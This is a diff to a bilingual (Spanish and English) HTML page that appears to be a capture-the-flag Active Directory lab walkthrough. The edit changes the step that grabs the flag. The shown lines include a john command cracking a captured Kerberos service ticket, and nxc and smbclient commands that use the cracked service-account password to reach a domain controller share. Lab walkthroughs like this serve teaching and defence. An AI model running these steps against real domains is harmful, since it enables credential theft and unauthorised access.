@@ -64,7 +64,8 @@ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt captured_tgs.t
     <h3>5 · Capturar la flag</h3>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.mssql' -p 'ranger' --shares
 
-smbclient //{{ ad_dc_ip }}/sqldata -U '{{ ad_domain }}\svc.mssql%ranger' -c 'get flag-ad-05.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/sqldata -U '{{ ad_domain }}\svc.mssql%ranger' -c 'get flag-ad-05.txt'
+cat flag-ad-05.txt</pre>
     <pre>HL{···}</pre>
 
     <h3>Mitigación</h3>
@@ -119,7 +120,8 @@ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt captured_tgs.t
     <h3>5 · Capture the flag</h3>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.mssql' -p 'ranger' --shares
 
-smbclient //{{ ad_dc_ip }}/sqldata -U '{{ ad_domain }}\svc.mssql%ranger' -c 'get flag-ad-05.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/sqldata -U '{{ ad_domain }}\svc.mssql%ranger' -c 'get flag-ad-05.txt'
+cat flag-ad-05.txt</pre>
     <pre>HL{···}</pre>
 
     <h3>Mitigation</h3>
